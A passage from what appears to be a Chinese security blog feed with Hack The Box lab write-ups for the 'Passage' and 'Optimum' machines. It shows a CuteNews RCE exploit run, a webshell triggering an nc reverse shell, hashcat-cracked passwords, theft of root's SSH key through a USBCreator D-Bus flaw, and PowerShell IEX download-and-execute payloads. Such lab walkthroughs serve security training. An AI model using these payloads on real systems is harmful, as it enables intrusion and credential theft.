17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)</span><br><span class="line">|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:<span class="built_in">fc</span> (ECDSA)</span><br><span class="line">|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)</span><br><span class="line">80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Passage News</span><br><span class="line">10621/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 258.09 seconds</span><br></pre></td></tr></tbody></table></figure><p>页面打开为一个新闻界面，查看页面源码</p><a id="more"></a><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span><span class="xml"><span class="tag"><<span class="name">i</span> <span class="attr">class</span>=<span class="string">"icon-user icon-blog-mini"</span>></span><span class="tag"></<span class="name">i</span>></span></span> By <a href=<span class="string">"mailto:nadav@passage.htb"</span>>admin<<span class="regexp">/a></</span>span></span><br><span class="line"><span><span class="xml"><span class="tag"><<span class="name">i</span> <span class="attr">class</span>=<span class="string">"icon-user icon-blog-mini"</span>></span><span class="tag"></<span class="name">i</span>></span></span> By <a href=<span class="string">"mailto:kim@example.com"</span>>Kim Swift<<span class="regexp">/a></</span>span></span><br></pre></td></tr></tbody></table></figure><p>页面源码中包含<code>passage.htb, admin:nadav@passage.htb, paul@passage.htb,kim@example.com, sid@example.com</code>, 推断可能存在<code>nadav, paul</code>等用户。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powered by CuteNews 2.1.2 © 2002–2021 CutePHP.</span><br></pre></td></tr></tbody></table></figure><p>从<code>http://10.129.104.160/CuteNews/index.php</code>页面信息可以发现80端口网页使用的模板是CuteNews 2.1.2版本，Google发现存在RCE可以直接利用：<code>https://www.exploit-db.com/exploits/48800</code>。</p><h2 id="0x01-获得foothold"><a href="#0x01-获得foothold" class="headerlink" title="0x01 获得foothold"></a>0x01 获得foothold</h2><p>利用<code>exp</code>脚本执行，可以直接获得www-data权限</p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">           _____     __      _  __                     ___   ___  ___ </span><br><span class="line">          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |</span><br><span class="line">         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ </span><br><span class="line">         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ </span><br><span class="line">                                ___  _________                        </span><br><span class="line">                               / _ \/ ___/ __/                        </span><br><span class="line">                              / , _/ /__/ _/                          </span><br><span class="line">                             /_/|_|\___/___/                          </span><br><span class="line">                                                                      </span><br><span class="line"></span><br><span class="line">                                                                                                                                                   </span><br><span class="line"></span><br><span class="line">[->] Usage python3 expoit.py</span><br><span class="line"></span><br><span class="line">Enter the URL> http://10.129.90.135</span><br><span class="line">================================================================</span><br><span class="line">Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN</span><br><span class="line">================================================================</span><br><span class="line"><span class="attribute">7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1</span></span><br><span class="line"><span class="attribute">4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88</span></span><br><span class="line"><span class="attribute">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd</span></span><br><span class="line"><span class="attribute">f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca</span></span><br><span class="line"><span class="attribute">4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc</span></span><br><span class="line">================================================================</span><br><span class="line"></span><br><span class="line">=============================</span><br><span class="line">Registering a users</span><br><span class="line">=============================</span><br><span class="line">[+] Registration successful with username: ZmgRB8hLtC and password: ZmgRB8hLtC</span><br><span class="line"></span><br><span class="line">=======================================================</span><br><span class="line">Sending Payload</span><br><span class="line">=======================================================</span><br><span class="line"><span class="attribute">signature_key</span>: 1e55ed33ba7b8dd6ad8b92b3433074d7-ZmgRB8hLtC</span><br><span class="line"><span class="attribute">signature_dsi</span>: 802a15242f360a141cc8c982deb26cc3</span><br><span class="line">logged in user: ZmgRB8hLtC</span><br><span class="line">============================</span><br><span class="line">Dropping to a SHELL</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">command > id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></tbody></table></figure><p>尝试使用<code>python -c "import pty; pty.spawn('/bin/bash')"</code>生成标准的bash ，发现行不通 ，<code>exp</code>脚本生成的bash不支持部分回显。进一步发现<code>/CuteNews/uploads</code>路径，可以看到上传的文件。尝试生成<code>webshell</code>通过<code>SimpleHTTPServer</code>传递。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> > <span class="built_in">pwd</span></span><br><span class="line">/var/www/html/CuteNews/uploads</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> > ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxrwxrwx 2 www-data www-data 4096 Feb 26 07:43 .</span><br><span class="line">drwxrwxr-x 9 www-data www-data 4096 Jun 18  2020 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data   39 Feb 26 07:43 avatar_36fUuEQWLg_36fUuEQWLg.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1115 Aug 31 13:48 avatar_egre55_ykxnacpt.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1116 Aug 31 14:55 avatar_hacker_jpyoyskt.php</span><br></pre></td></tr></tbody></table></figure><p>将<code>/usr/share/seclists/Web-Shells/FuzzDB/cmd-simple.php</code>复制到当前目录，使用python的简易HTTP服务上传<code>webshell</code>。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> > wget http://10.10.14.29:8000/exp.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> > ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxrwxrwx 2 www-data www-data 4096 Feb 26 07:51 .</span><br><span class="line">drwxrwxr-x 9 www-data www-data 4096 Jun 18  2020 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data   39 Feb 26 07:43 avatar_36fUuEQWLg_36fUuEQWLg.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1115 Aug 31 13:48 avatar_egre55_ykxnacpt.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1116 Aug 31 14:55 avatar_hacker_jpyoyskt.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data  328 Feb 26 07:49 exp.php</span><br></pre></td></tr></tbody></table></figure><p>通过<code>webshell</code>反向连接主机<code>http://passage.htb/CuteNews/uploads/exp.php?cmd=nc%20-e%20/bin/bash%2010.10.14.29%204444</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/fnut/passage]</span><br><span class="line">└─<span class="comment"># nc -nvlp 4444</span></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.29] from (UNKNOWN) [10.129.104.160] 59634</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></tbody></table></figure><p>使用<code>python3 -c "import pty; pty.spawn('/bin/bash')"</code>生成标准的shell。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">www-data@passage:/var/www/html/CuteNews/uploads$</span><br></pre></td></tr></tbody></table></figure><h2 id="0x02-权限提升-user"><a href="#0x02-权限提升-user" class="headerlink" title="0x02 权限提升-user"></a>0x02 权限提升-user</h2><p>在<code>/home</code>目录下发现两个用户<code>nadav/paul</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@passage:/home$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root  root  4096 Jul 21  2020 .</span><br><span class="line">drwxr-xr-x 23 root  root  4096 Jul 21  2020 ..</span><br><span class="line">drwxr-x--- 17 nadav nadav 4096 Feb  2 17:24 nadav</span><br><span class="line">drwxr-x--- 16 paul  paul  4096 Sep 30 05:08 paul</span><br></pre></td></tr></tbody></table></figure><p>刚才RCE的payload中<code>/CuteNews/cdata/users/lines</code>发现的hashes如下</p><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Enter the URL> http://10.129.104.160</span><br><span class="line">================================================================</span><br><span class="line">Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN</span><br><span class="line">================================================================</span><br><span class="line">7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1</span><br><span class="line">4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88</span><br><span class="line">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd</span><br><span class="line">f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca</span><br><span class="line">4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc</span><br><span class="line">================================================================</span><br></pre></td></tr></tbody></table></figure><p>使用hashcat破解得到两个密码，第二个密码为paul密码</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc:egre55</span><br><span class="line">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1</span><br><span class="line"></span><br><span class="line">www-data@passage:/home$ su paul</span><br><span class="line">su paul</span><br><span class="line">Password: atlanta1</span><br><span class="line"></span><br><span class="line">paul@passage:/home$</span><br></pre></td></tr></tbody></table></figure><p>为了获得完整的交互式shell， 我们有两种方法。第一种就是通过paul文件夹下.ssh隐藏目录中的<code>authorized_keys</code>，添加自己主机ssh公钥可以直接ssh连到靶机。或者也可以复制id_rsa私钥，复制到本地，使用ssh -i id_rsa <a href="mailto:paul@10.129.x.x" target="_blank" rel="noopener">paul@10.129.x.x</a>来连接到靶机。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C xxxx</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDG5YNTqrYspjD/1uwVgou+24/XTFvH2lzlM1NyYrR5DUrffFGBduqCgxf9IOACLK4XHCtw4bCritViKFaud7GRcTJLCL+YjTQ1DLGts9srkSpvXpJb7s22arNmWMYhiipJ2BIjfpAkw/rMsA6J7KQ6xWEpfsmlkU0VcAFZySZjiuH65c7eamA1Rq/FRl+uFebEFgaR9GkHpMG7dZ/2J49Z/bzUyAr4VTz8xFOKS0Tz7Y4p2z4hYHLc4+wVk54DQLdAskkRYf8oRIZl0xUoV4D11ioFrTN0VlOuZw4ILOlDRg5XU56tzAt7qY6GrCnrVnb1BwYrcf4kZ2rlGCZiDBEdTStqj/UB3gEut6IXrSw4bJf3/sHqIE5R8HAMRGcqrkK0Zh/jcNDkxYehNj7X8ZgRxzGq1n4+yVzah239EotYkXJO6MqagVevATdr/x/Joy4+JoI4TPXJ8bt3hYIWzxImbz3Ek1pbcJTYbuXhDm9hidfbOpgDGPFt1q6rWO9fI5M="</span> >>authorized_keys</span><br></pre></td></tr></tbody></table></figure><p>第二种就是<code>ippsec</code>大神的进化反弹shell的方法，先<code>ctrl+Z</code>将反弹shell的任务切换到后台运行，然后使用以下命令来让反弹shell获得<code>TAB</code>键等更方便操作的功能。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br></pre></td></tr></tbody></table></figure><p>并且我们发现<code>.ssh/authorized_keys</code>文件中包含有nadav用户的公钥</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paul@passage:~/.ssh$ cat authorized_keys </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage</span><br></pre></td></tr></tbody></table></figure><p>所以我们可以直接从paul用户使用ssh切换到nadav用户</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">paul@passage:~/.ssh$ ssh nadav@10.129.104.160</span><br><span class="line">The authenticity of host <span class="string">'10.129.104.160 (10.129.104.160)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>10.129.104.160<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1</span></span><br><span class="line"><span class="string">nadav@passage:~$</span></span><br></pre></td></tr></tbody></table></figure><h2 id="0x03-权限提升-root"><a href="#0x03-权限提升-root" class="headerlink" title="0x03 权限提升-root"></a>0x03 权限提升-root</h2><p>查看nadav用户所属的groups组</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nadav@passage:~$ groups</span><br><span class="line">nadav adm cdrom sudo dip plugdev lpadmin sambashare</span><br></pre></td></tr></tbody></table></figure><p>查看当前运行的进程， 发现运行了一个<code>dbus</code>进程</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message+    693      1  0 07:14 ?        00:00:00 /usr/bin/dbus-daemon --system</span><br></pre></td></tr></tbody></table></figure><p>搜索D-bus相关漏洞，发现如下文章，可以利用D-bus来覆盖或者获取某些root文件的信息</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</span><br></pre></td></tr></tbody></table></figure><p>尝试使用D-bus漏洞，重写/etc/passwd文件(不可行)。因为即使添加了无密码root权限用户，也无法使用ssh登录</p><figure class="highlight oxygene"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --<span class="function"><span class="keyword">method</span> <span class="title">com</span>.<span class="title">ubuntu</span>.<span class="title">USBCreator</span>.<span class="title">Image</span> /<span class="title">home</span>/<span class="title">nadav</span>/<span class="title">passwd</span> /<span class="title">etc</span>/<span class="title">passwd</span> <span class="title">true</span></span></span><br></pre></td></tr></tbody></table></figure><p>尝试重写公钥文件也不可行，ssh登录强制要求输入密码，只能偷取私钥文件</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_keys <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p>利用获取到的ssh私钥连接</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh -i root_id_rsa root@x.x.x.x</span><br><span class="line"></span><br><span class="line">┌──(potato㉿kali)-[/home/fnut/passage]</span><br><span class="line">└─$ ssh -i id_rsa_root root@10.129.104.160</span><br><span class="line">Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1</span><br><span class="line">root@passage:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></tbody></table></figure><p>Done!~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-信息收集&quot;&gt;&lt;a href=&quot;#0x00-信息收集&quot; class=&quot;headerlink&quot; title=&quot;0x00 信息收集&quot;&gt;&lt;/a&gt;0x00 信息收集&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;nmap&lt;/code&gt;进行端口扫描，发现只有以下端口开放：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nmap -sC -sV -oA nmap 10.129.104.160&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 10:24 EST&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nmap scan report &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 10.129.104.160&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host is up (0.25s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Not shown: 997 closed ports&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PORT      STATE    SERVICE VERSION&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| ssh-hostkey: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:&lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt; (ECDSA)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|_http-title: Passage News&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10621/tcp filtered unknown&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nmap &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt;: 1 IP address (1 host up) scanned &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 258.09 seconds&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;页面打开为一个新闻界面，查看页面源码&lt;/p&gt;
    
    </summary>
    
      <category term="Hackthebox" scheme="http://yoursite.com/categories/Hackthebox/"/>
    
    
      <category term="Hackthebox" scheme="http://yoursite.com/tags/Hackthebox/"/>
    
  </entry>
  
  <entry>
    <title>Hackthebox--Optimum</title>
    <link href="http://yoursite.com/2021/02/25/Hackthebox--Optimum/"/>
    <id>http://yoursite.com/2021/02/25/Hackthebox--Optimum/</id>
    <published>2021-02-25T13:45:54.763Z</published>
    <updated>2021-02-25T13:47:22.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Powershell-windows提权"><a href="#0x00-Powershell-windows提权" class="headerlink" title="0x00 Powershell windows提权"></a>0x00 Powershell windows提权</h2><ul><li>Github相关项目<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Empire     https:<span class="regexp">//gi</span>thub.com<span class="regexp">/EmpireProject/</span>Empire</span><br><span class="line">nishang    https:<span class="regexp">//gi</span>thub.com<span class="regexp">/samratashok/</span>nishang</span><br><span class="line">sherlock   https:<span class="regexp">//gi</span>thub.com<span class="regexp">/rasta-mouse/</span>Sherlock</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><ul><li><p>payload1:powershell反向连接</p><a id="more"></a><figure class="highlight nimrod"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?search=%<span class="number">00</span><span class="meta">{.exec|c:Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.126:8000/Invoke-PowerShellTcp.ps1').}</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>payload2:Sherlock.ps1查找相关漏洞</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">IEX</span><span class="params">(New-Object Net.Webclient)</span></span>.downloadString(<span class="string">'http://10.10.14.126:8000/Sherlock.ps1'</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>payload3:提权+反向shell<br>修改Invoke-PowershellTcp.ps1监听端口，然后修改Invoke-MS16032.ps1中内容，使用payload1进行调用</p></li></ul><h2 id="0x02-Powershell相关搜索命令"><a href="#0x02-Powershell相关搜索命令" class="headerlink" title="0x02 Powershell相关搜索命令"></a>0x02 Powershell相关搜索命令</h2><ul><li>powershell搜索文件<br>Get-ChildItem -Recurse -Include ‘*.txt’</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Powershell-windows提权&quot;&gt;&lt;a href=&quot;#0x00-Powershell-windows提权&quot; class=&quot;headerlink&quot; title=&quot;0x00 Powershell windows提权&quot;&gt;&lt;/a&gt;0x00 Powershell windows提权&lt;/h2&gt;&lt;ul&gt;
